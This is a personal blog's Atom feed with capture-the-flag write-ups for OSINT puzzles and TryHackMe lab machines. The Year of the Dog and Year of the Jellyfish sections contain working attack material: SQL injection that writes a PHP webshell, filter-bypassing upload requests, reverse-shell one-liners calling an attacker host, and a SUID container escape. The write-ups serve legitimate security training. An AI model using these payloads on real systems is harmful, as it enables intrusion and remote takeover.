+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;I used “Mike Shallot” as a seed for a Spiderfoot scan and clicked through all of the website profile pages it generated. This led to me &lt;a href=&quot;https://pastebin.com/WVUP8dRD&quot;&gt;this&lt;/a&gt; pastebin:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This site is not as safe as we need it to be. 
+Meet me in the dark and I will share my secret with you.
+ 
+Find me in the shadows, these may act as your light:
+ 
+strongerw2ise74v3duebgsvug4mehyhlpa7f6kfwnas7zofs3kov7yd
+ 
+pduplowzp/nndw79
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A shallot is an &lt;em&gt;allium&lt;/em&gt; vegetable just like an &lt;em&gt;onion&lt;/em&gt;. Which is a hint that the next portion of this hunt is going to be on a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.onion&lt;/code&gt; website.&lt;/p&gt;
+
+&lt;p&gt;I load up a TOR browser and visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.onion&lt;/code&gt; URL provided in the paste. It’s another Pastebin-style website. I use the smaller string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pduplowzp/nndw79&lt;/code&gt; as a subdirectory and find the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/shallot.png&quot; alt=&quot;screenshot of a paste containing the flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;jed-sheeran&quot;&gt;Jed Sheeran&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;I googled “Jed Sheeran” and find &lt;a href=&quot;https://soundcloud.com/user-836083929-176777888&quot;&gt;this&lt;/a&gt; Soundcloud profile. The flag is in one of the comments on one of the songs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/jed.png&quot; alt=&quot;Picture of a comment with the flag in it&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;personal-reflection&quot;&gt;Personal Reflection&lt;/h1&gt;
+&lt;p&gt;This was my first jeopardy style CTF and I had a ton of fun. I competed fairly casually, didn’t pull any all-nighters or anything like that.&lt;/p&gt;
+
+&lt;p&gt;I think it kind of awakened a flame in me for CTFs though because now I want to compete again next year, and more seriously. I think I might just do tons of CTFs for fun.&lt;/p&gt;
+
+&lt;p&gt;For some reason video games stopped being interesting to me a couple years ago and I’ve honestly been looking for a fun de-stressing activity to replace it. CTFs might be it.&lt;/p&gt;
+
+&lt;p&gt;I adore cooking but it doesn’t have the same engrossing feeling that video games used to have for me. Or that CTFs seem to have for me now. So hell yeah.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Thank you John Hammond.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/cert.png&quot; alt=&quot;A certificate of participation for the CTF, I placed 121/2527. I'll get top 10 next year :)&quot; /&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>CTF Log - Year of the Dog {THM}</title>
+   <link href="https://h0th.lol/2021/09/13/year-of-the-dog-ctf-log"/>
+   <updated>2021-09-13T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2021/09/13/year-of-the-dog-ctf-log</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A log of how I did the TryHackMe room Year of the Dog by Muirland Oracle&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;year-of-the-dog&quot;&gt;Year of the Dog&lt;/h1&gt;
+&lt;h2 id=&quot;request-header-sqli&quot;&gt;Request Header SQLi&lt;/h2&gt;
+&lt;p&gt;A portscan reveals the only ports: 22, 80.&lt;/p&gt;
+
+&lt;p&gt;The web server seems to have practically no content. The only thing I fuzzed that returned an interesting result was the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; cookie parameter. Adding a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'&lt;/code&gt; to it causes the website to error out, so it seems like some sort of injection is afoot.&lt;/p&gt;
+
+&lt;p&gt;The payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' union select 1, @@version#&lt;/code&gt; confirms that the cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; parameter is vulnerable to SQL injection.&lt;/p&gt;
+
+&lt;p&gt;I’m able to get a webshell on the server using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' into outfile '/var/www/html/wshell.php' fields terminated by 0x3c3f70687020706173737468727528245f4745545b2263225d293b203f3e#&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;A breakdown of that payload:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;into outfile&lt;/code&gt; - MySQL syntax to place the selected object into a file&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fields terminated by&lt;/code&gt; - Allows you to choose what data to append to each field in the new file&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3c3f70687020706173737468727528245f4745545b2263225d293b203f3e&lt;/code&gt; a hex encoded PHP webshell: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php passthru($_GET[&quot;c&quot;]); ?&amp;gt;&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x&lt;/code&gt; tells MySQL that the following data is hex and should be treated as such. This was done to bypass a web filter that flagged the characters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;gt;&lt;/code&gt; as malicious.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using that webshell, I’m able to execute a reverse shell and get a session on the machine as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;readable-authentication-log&quot;&gt;Readable Authentication Log&lt;/h2&gt;
+&lt;p&gt;To escalate to the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylan&lt;/code&gt;, I found a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;work_analysis&lt;/code&gt; in that user’s home directory.&lt;/p&gt;
+
+&lt;p&gt;The file seemed to be a copy of a locally hosted web application’s authentication logs. I grepped for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylan&lt;/code&gt; in that file and found an entry where the user had accidentally typed their password in the username field.&lt;/p&gt;
+
+&lt;p&gt;Using this password, I’m able to get an SSH session as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylan&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;database-overwrite--malicious-git-hook&quot;&gt;Database Overwrite &amp;amp; Malicious Git Hook&lt;/h2&gt;
+&lt;p&gt;A check on the active ports showed a Gitea server being served on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:3000&lt;/code&gt;. I used SSH with the port-forwarding parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L 8090:127.0.0.1:3000&lt;/code&gt; to send connections against my local machine’s port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8090&lt;/code&gt; to the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:3000&lt;/code&gt; through the SSH connection.&lt;/p&gt;
+
+&lt;p&gt;With this, I’m able to browse the Gitea website. I create a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylan&lt;/code&gt; to download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gitea.db&lt;/code&gt; database file. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite&lt;/code&gt; I’m able to view the database and make edits to it. I find the user table and notice the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_admin&lt;/code&gt; parameter and edit that column to make my user an admin.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlite&amp;gt; select email, is_admin from user;
+dylan@yearofthedog.thm|1
+test@gmail.com|0
+
+sqlite&amp;gt; update user set is_admin = 1 where email = 'test@gmail.com';
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Refreshing the page now shows that my user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; is an admin.&lt;/p&gt;
+
+&lt;p&gt;With admin privileges I’m now able to use the githooks functionality. I create a repo and append this reverse shell code: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; &amp;gt;/tmp/f&lt;/code&gt; to one of the template scripts in the repo’s githooks section.&lt;/p&gt;
+
+&lt;p&gt;It took some trial and error to arrive at that reverse shell. The version of that shell available on PentestMonkey didn’t function. Fortunately, a verbose stack trace was displayed in the terminal when the script failed, allowing me to refine the one-liner.&lt;/p&gt;
+
+&lt;p&gt;![[error.png]]&lt;/p&gt;
+
+&lt;p&gt;I also did some online research on different types of bash/sh reverse shells.&lt;/p&gt;
+
+&lt;h2 id=&quot;abusing-container-privileges&quot;&gt;Abusing Container Privileges&lt;/h2&gt;
+&lt;p&gt;Naturally, the reverse shell from the githook places me in a container.&lt;/p&gt;
+
+&lt;p&gt;I’m easily able to get root access since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; is available for all commands; I just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -s&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Reading through the Gitea documentation and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app.ini&lt;/code&gt; file for the web server, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data&lt;/code&gt; directory within the container maps to a directory on the host machine.&lt;/p&gt;
+
+&lt;p&gt;I navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; with my session as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylan&lt;/code&gt; and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server&lt;/code&gt; to host a web server on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Within the container, I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip a&lt;/code&gt; to see that the container is communicating through the virtual IP of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.2&lt;/code&gt;. The gateway address in this subnet would naturally route to the host machine, so I do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget 172.17.0.1:8000/bash -O /data/bash&lt;/code&gt; to download a copy of the bash binary.&lt;/p&gt;
+
+&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +sx /data/bash&lt;/code&gt; I make the binary executable by anyone and give it the SUID bit. Since I’ve downloaded it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; within the container, the SUID bit will make the binary run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;With my session as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylan&lt;/code&gt; I do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./bash -p&lt;/code&gt; to get a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;. Here is an explanation of what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; is for, taken from the bash man pages:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If the shell is started with the effective user (group) id not equal to the real user (group) id, and the **-p**option is not supplied, no startup files are read, shell functions are not inherited from the environment, the **SHELLOPTS**, **BASHOPTS**, **CDPATH**, and **GLOBIGNORE** variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the **-p** option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>CTF Log - Year of the Jellyfish {THM}</title>
+   <link href="https://h0th.lol/2021/09/06/year-of-the-jellyfish-ctf-log"/>
+   <updated>2021-09-06T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2021/09/06/year-of-the-jellyfish-ctf-log</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A log of how I did the TryHackMe room Year of the Jellyfish by Muirland Oracle&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;year-of-the-jellyfish&quot;&gt;Year of the Jellyfish&lt;/h1&gt;
+&lt;h2 id=&quot;monitorr-176m-unauthed-file-upload&quot;&gt;Monitorr 1.7.6m Unauthed File Upload&lt;/h2&gt;
+&lt;p&gt;The initial nmap scan returned the following open TCP ports: 21, 22, 80, 443, 8000, 8096. As it would turn out, ports 8000 and 8096 are red herrings and don’t lead to any foothold on the box. This is something I was sad to discover, as I was looking forward to exploiting the Jellyfin Media Server.&lt;/p&gt;
+
+&lt;p&gt;Looking into the SSL certificate for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robyns-petshop.thm&lt;/code&gt;, I see that it also supports the subdomains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitorr&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;beta&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Navigating to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://monitorr.robyns-petshop.thm&lt;/code&gt; I find Monitorr v1.7.6m is running. This version has an unauthenticated file upload vulnerability, which can naturally be converted into RCE.&lt;/p&gt;
+
+&lt;p&gt;I also notice that my requests are sending the cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isHuman=1&lt;/code&gt;. I change the value to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; to see what happens and it doesn’t like it, accusing me of being a hacker. That’s prepostorous of course so I note to send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie: isHuman=1&lt;/code&gt; with all future requests.&lt;/p&gt;
+
+&lt;p&gt;As I’m practicing for the OSWE exam, I choose to build my own exploit code based on the knowledge that the vulnerability relates to the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/assets/php/upload.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lets break down this portion of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload.php&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$target_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;../data/usrimg/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$target_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$target_dir&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$uploadOk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;PATHINFO_EXTENSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getimagesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$rawfile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On line 2, the $_FILES is a superglobal PHP variable that refers to files uploaded through a POST request.&lt;/p&gt;
+
+&lt;p&gt;The first subscript &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[&quot;fileToUpload&quot;]&lt;/code&gt; refers to the name of the file upload section in the multipart/form-data formatted POST request body.&lt;/p&gt;
+
+&lt;p&gt;The second subscript &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[&quot;name&quot;]&lt;/code&gt; refers to the actual filename, as it was uploaded. In this case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; is a placeholder for the actual filename, not the name of the file.&lt;/p&gt;
+
+&lt;p&gt;Anyway, all this is piece of code is saying, is that it will save the file I send in a POST request to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload.php&lt;/code&gt; endpoint.&lt;/p&gt;
+
+&lt;p&gt;For a preliminary proof of concept, I make a simple HTML upload form:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://monitorr.robyns-petshop.thm/assets/php/upload.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+ 	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+ 	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By capturing the request in burp and sending it to repeater, I’m able to easily fuzz and experiment with different payloads.&lt;/p&gt;
+
+&lt;p&gt;Through a bit of experimentation, I determine the following limitations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;filename extension cannot begin with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;filename must have an image filetype extension&lt;/li&gt;
+  &lt;li&gt;file must begin with magic bytes corresponding to an image file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I’m able to bypass the filters and upload a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.phtml&lt;/code&gt; file which will render and execute PHP code using the following POST request:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /assets/php/upload.php HTTP/1.1
+Host: monitorr.robyns-petshop.thm
+Content-Type: multipart/form-data; boundary=--------------------------190412675211009862293213789695
+Content-Length: 350
+Cookie: isHuman=1
+
+-----------------------------190412675211009862293213789695
+Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;webshell.png.phtml&quot;
+Content-Type: image/png
+
+PNG
+&amp;lt;?php passthru($_GET[&quot;c&quot;]);
+-----------------------------190412675211009862293213789695--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The filename &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webshell.png.phtml&lt;/code&gt; satisfies the image filetype extension requirement while bypassing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/\.php.*/&lt;/code&gt; pattern matching filter for the extension.&lt;/li&gt;
+  &lt;li&gt;Some experimentation was needed to determine that the webshell payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php passthru($_GET[&quot;c&quot;]);&lt;/code&gt; should not have a closing bracket &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; to properly function.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/yearofthejellyfish/webshell.png&quot; alt=&quot;Output of 'id' on the webshell page. You can see some of the binary data from the image file being rendered as unicode characters.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I URL encoded this PHP oneliner reverse shell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php -r '$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;PORT&amp;gt;);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/code&gt; and caught a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2019-7304&quot;&gt;CVE-2019-7304&lt;/h2&gt;
+&lt;p&gt;After some enumeration the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt list --upgradeable&lt;/code&gt; shows me an outdated version of Snapd: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snapd/bionic-updates 2.49.2+18.04 amd64 [upgradable from: 2.32.5+18.04]&lt;/code&gt;. This version is susceptible to a neat vulnerability, CVE-2019-7304, that involves creating a UbuntuOne account online.&lt;/p&gt;
+
+&lt;p&gt;After creating an account, you provide it with a public SSH key and then use the private counterpart to start a malicious socket connection to the package manager.&lt;/p&gt;
+
+&lt;p&gt;From there you’re able to create a new user with root privileges.&lt;/p&gt;
+
+&lt;p&gt;The comments on &lt;a href=&quot;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py&quot;&gt;this&lt;/a&gt; PoC are well written and teach a good bit about how the exploit functions.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Archive - CTF Writeup - Jack {THM}</title>
+   <link href="https://h0th.lol/2020/11/14/jack-ctf-archive"/>
+   <updated>2020-11-14T00:00:00-06:00</updated>
+   <id>https://h0th.lol/2020/11/14/jack-ctf-archive</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;An archive of an old writeup I wrote about the THM room “Jack”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;As always, to skip straight to the writeup please use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contents Bar&lt;/code&gt; on that right. ———&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/jack&quot;&gt;Jack&lt;/a&gt; is a CTF hosted on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. It involves basic Wordpress enumeration, Python Module Abuse, and Lateral Privilege Escalation.&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;As per the instructions on the Jack room page, an entry for jack.thm was added to my /etc/hosts file.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h1&gt;
+
+&lt;p&gt;As always, real hackers hack time, and as I value my time when doing CTFs I like to start with Rustscan. The command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustscan -r 0-65535 -u 5000 10.10.81.39 -- -A -oN scans/nmap.txt&lt;/code&gt; blasts all TCP ports on the target machine to ascertain which ports are open, then automatically performs a Nmap scan with the options &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A -oN scans/nmap.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/jack/Rustscan.png&quot; alt=&quot;Screenshot of Rustscan Initial Screen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The open ports are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;22&lt;/li&gt;
+  &lt;li&gt;80&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this case, the port that I am interested in is port 80. After navigating to the web page using my browser, I find what seems to be a typical blog. I quickly find that it is a Wordpress blog by checking the page source and seeing default Wordpress file paths.&lt;/p&gt;
+
+&lt;p&gt;I send &lt;a href=&quot;https://github.com/wpscanteam/wpscan&quot;&gt;wpscan&lt;/a&gt; at the site using the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan --detection-mode aggressive --url jack.thm -e | tee scans/wpscan.txt&lt;/code&gt; and it finds three usernames:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;jack&lt;/li&gt;
+  &lt;li&gt;wendy&lt;/li&gt;
+  &lt;li&gt;danny&lt;/li&gt;
+&lt;/ul&gt;
+
